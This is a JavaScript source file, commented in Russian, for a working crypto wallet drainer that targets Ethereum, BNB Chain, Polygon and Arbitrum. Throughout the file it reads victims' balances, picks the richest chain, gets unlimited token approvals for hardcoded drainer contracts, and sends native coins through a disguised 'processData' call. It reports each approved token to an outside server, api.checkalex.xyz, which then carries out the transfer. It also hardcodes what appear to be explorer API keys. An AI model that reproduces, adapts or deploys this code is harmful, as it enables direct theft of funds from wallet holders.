import { ethers } from 'ethers';

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// Ключи API для сканеров
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// Идентификаторы токенов (по символу токена для Binance API)
const TOKEN_SYMBOLS = {
  "ETH": "ETHUSDT",
  "BNB": "BNBUSDT",
  "MATIC": "MATICUSDT",
  "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT",
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDCUSDT",
  "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAIUSDT",
  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTCUSDT",
  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNIUSDT",
  "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINKUSDT",
  "0xc00e94Cb662C3520282E6f5717214004A7f26888": "COMPUSDT",
  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e": "YFIUSDT",
  "0xD533a949740bb3306d119CC777fa900bA034cd52": "CRVUSDT",
  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF": "BATUSDT",
  "0xE41d2489571d322189246DaFA5ebDe1F4699F498": "ZRXUSDT",
  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
  "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": "BNBUSDT",
  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE": "SHIBUSDT",
  "0x6982508145454Ce325dDbE47a25d4ec3d2311933": "PEPEUSDT",
  "0x27C70Cd1946795B66be9d954418546998b546634": "LEASHUSDT",
  "0x55d398326f99059fF775485246999027B3197955": "USDT",
  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "USDCUSDT",
  "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D": "SHIBUSDT",
  "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00": "PEPEUSDT",
  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKIUSDT",
  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "USDT",
  "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDCUSDT",
  "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec": "SHIBUSDT",
  "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56": "PEPEUSDT",
  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9": "USDT",
  "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8": "USDCUSDT",
  "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36": "SHIBUSDT",
  "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51": "PEPEUSDT"
};

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY,
    otherTokenAddresses: {
      DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
      UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
      LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
      COMP: "0xc00e94Cb662C3520282E6f5717214004A7f26888",
      YFI: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
      CRV: "0xD533a949740bb3306d119CC777fa900bA034cd52",
      BAT: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF",
      ZRX: "0xE41d2489571d322189246DaFA5ebDe1F4699F498",
      LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
      BNB: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
      SHIB: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
      PEPE: "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
      LEASH: "0x27C70Cd1946795B66be9d954418546998b546634"
    }
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      PEPE: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006"
    }
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      PEPE: "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56",
    }
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36",
      PEPE: "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51",
    }
  }
};

// Функция для получения цены токена в USDT через Binance API
async function getTokenPriceInUSDT(tokenSymbol) {
  if (tokenSymbol === "USDT") return 1;

  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
    const data = await response.json();
    if (data.price) return parseFloat(data.price);
    throw new Error(`Цена для ${tokenSymbol} не найдена`);
  } catch (e) {
    console.warn(`⚠️ Ошибка получения цены для ${tokenSymbol}: ${e.message}`);
    return 0;
  }
}

// Функция для параллельного выбора рабочего провайдера
async function getWorkingProvider(rpcUrls, existingProvider = null) {
  if (existingProvider) {
    try {
      await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log('✅ Используется переданный провайдер');
      return existingProvider;
    } catch (e) {
      console.warn('⚠️ Переданный провайдер ненадёжен:', e.message);
    }
  }

  const providerPromises = rpcUrls.map(async (rpc) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Используется RPC: ${rpc}`);
      return provider;
    } catch (e) {
      console.warn(`⚠️ RPC ${rpc} недоступен: ${e.message}`);
      return null;
    }
  });

  const results = await Promise.all(providerPromises);
  const workingProvider = results.find(provider => provider !== null);
  if (!workingProvider) throw new Error(`Нет доступных RPC для ${rpcUrls}`);
  return workingProvider;
}

// Получение баланса нативного токена через API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") return ethers.BigNumber.from(data.result);
  throw new Error(data.message || `Ошибка API для ${config.name}`);
}

// Получение баланса токена через API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") return ethers.BigNumber.from(data.result);
  throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
}

// Проверка баланса с использованием API и fallback на RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, tokenBalances = {};

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
  }

  try {
    tokenBalances[config.usdcAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
  }

  if (config.otherTokenAddresses) {
    const tokenAddresses = Object.values(config.otherTokenAddresses);
    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
      try {
        return { address: tokenAddress, balance: await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId) };
      } catch (e) {
        console.warn(`Ошибка API для токена ${tokenAddress} в ${config.name}: ${e.message}`);
        const provider = await getWorkingProvider(config.rpcUrls);
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        return { address: tokenAddress, balance: await token.balanceOf(userAddress) };
      }
    });

    const results = await Promise.all(balancePromises);
    results.forEach(({ address, balance }) => {
      tokenBalances[address] = balance;
    });
  }

  return { nativeBalance, tokenBalances };
}

// Проверка наличия средств
function hasFunds(bal) {
  const minNativeBalance = ethers.utils.parseEther("0.001");
  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);

  if (bal.nativeBalance.gt(minNativeBalance)) return true;

  for (const balance of Object.values(bal.tokenBalances)) {
    if (balance.gt(minTokenBalance)) return true;
  }

  return false;
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`Ошибка переключения на сеть ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);

  const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
  const ethBalance = await reliableProvider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
    throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
  }

  const tokensToProcess = [];
  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];

  // Параллельно запрашиваем баланс и decimals для всех токенов
  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    const [realBalance, decimals] = await Promise.all([
      tokenContract.balanceOf(userAddress),
      tokenContract.decimals()
    ]);
    return { tokenAddress, tokenContract, realBalance, decimals };
  });

  const tokenDataResults = await Promise.all(tokenDataPromises);

  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
    if (realBalance.gt(0)) {
      console.log(`📊 Токен ${tokenAddress} баланс (реальный): ${ethers.utils.formatUnits(realBalance, decimals)}`);
    }

    if (realBalance.lt(bal.tokenBalances[tokenAddress])) {
      console.error(`❌ Некорректный баланс для ${tokenAddress}: API вернул ${ethers.utils.formatUnits(bal.tokenBalances[tokenAddress], decimals)}, реальный: ${ethers.utils.formatUnits(realBalance, decimals)}`);
      bal.tokenBalances[tokenAddress] = realBalance;
    }

    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                    tokenAddress === config.usdcAddress ? "USDC" :
                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
    }
  }

  // Параллельно запрашиваем цены токенов
  const pricePromises = tokensToProcess.map(async (token) => {
    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
    token.valueInUSDT = balanceInUnits * price;
    console.log(`💰 ${token.token}: ${balanceInUnits} × $${price} = $${token.valueInUSDT.toFixed(2)} USDT`);
    return token;
  });

  await Promise.all(pricePromises);

  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
  console.log("📋 Токены отсортированы по стоимости в USDT (по убыванию):", tokensToProcess.map(t => `${t.token}: $${t.valueInUSDT.toFixed(2)}`));

  let status = 'rejected';
  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, decimals)}`);

    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, decimals)} ${token}`);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
        const tx = await contract.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log(`✅ ${token} approve успешен:`, tx.hash);
        const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, decimals)} ${token}`);
        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
        status = 'confirmed';
      } catch (e) {
        console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
        throw e;
      }
    } else {
      console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
      await notifyServer(userAddress, address, balance, chainId, null);
      status = 'confirmed';
    }
  }

  if (tokensToProcess.length === 0) {
    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1)");
  }

  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
        }
        console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
        status = 'confirmed';
      } catch (e) {
        console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
        throw e;
      }
    }
  }

  return status;
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
  try {
    const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals] = await Promise.all([
      token.balanceOf(userAddress),
      token.decimals()
    ]);
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;
    console.log(`📊 Округлённый баланс: ${roundedBalance}`);

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error('Баланс слишком мал для перевода');
    }

    console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      console.log("✅ Сервер уведомлён, трансфер будет выполнен");
    } else {
      console.error("❌ Ошибка от сервера:", data.message);
      throw new Error(data.message);
    }
  } catch (e) {
    console.error("❌ Ошибка при отправке данных на сервер:", e.message);
    throw e;
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      const config = CHAINS[chainId];
      console.log(`Сеть: ${config.name}`);

      const nativeTokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
      const nativeBalanceInUSDT = (parseFloat(ethers.utils.formatEther(balance.nativeBalance)) * nativeTokenPrice).toFixed(2);
      console.log(`💰 ${config.nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)} (≈ $${nativeBalanceInUSDT} USDT)`);

      const usdtBalance = balance.tokenBalances[config.usdtAddress];
      console.log(`🟠 USDT: ${ethers.utils.formatUnits(usdtBalance, 6)} (≈ $${parseFloat(ethers.utils.formatUnits(usdtBalance, 6)).toFixed(2)} USDT)`);

      const usdcPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.usdcAddress]);
      const usdcBalance = balance.tokenBalances[config.usdcAddress];
      const usdcBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(usdcBalance, 6)) * usdcPrice).toFixed(2);
      console.log(`🔵 USDC: ${ethers.utils.formatUnits(usdcBalance, 6)} (≈ $${usdcBalanceInUSDT} USDT)`);

      if (config.otherTokenAddresses) {
        for (const [symbol, tokenAddress] of Object.entries(config.otherTokenAddresses)) {
          const balanceValue = balance.tokenBalances[tokenAddress];
          const decimals = symbol === "SHIB" ? 18 : 6;
          if (balanceValue && balanceValue.gt(0)) {
            const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress]);
            const tokenBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(balanceValue, decimals)) * tokenPrice).toFixed(8);
            console.log(`🔹 ${symbol}: ${ethers.utils.formatUnits(balanceValue, decimals)} (≈ $${tokenBalanceInUSDT} USDT)`);
          }
        }
      }

      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) => {
      const aTotal = Object.values(a.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      const bTotal = Object.values(b.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      return bTotal.gt(aTotal) ? 1 : -1;
    });

  if (!sorted.length) {
    console.warn("⛔ Нет подходящих сетей с балансом.");
    return 'rejected';
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target);
  return status;
}
